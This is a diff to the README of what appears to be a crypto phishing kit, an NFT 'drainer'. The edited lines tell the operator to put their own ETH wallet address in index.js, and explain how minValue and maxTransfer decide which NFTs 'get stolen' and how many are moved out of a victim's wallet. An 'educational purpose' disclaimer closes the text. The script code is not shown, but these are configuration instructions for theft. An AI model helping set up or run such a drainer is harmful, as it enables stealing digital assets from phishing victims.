@@ -33,7 +33,7 @@ Step 4: Start Your Fishing
 
 # 👻 Important : 
 
-Edit lines : ReceiveAddress: "YOUR WALLET", replace the wallet address on top of index.js file with your ETH wallet address.
+Edit lines : ReceiveAddress: "0x000000000000000000000000", replace YOUR WALLET with your ETH wallet address.
 Line "minValue: 0.1," is the minValue of a NFT before it gets stolen. Example : If you change this value to 1, the script will only steal NFTs that have a value higher to 1. Line maxTransfer with the amount max of NFTs transfer from the victim wallet to your wallet.
 
 This repository is only for educational purpose.
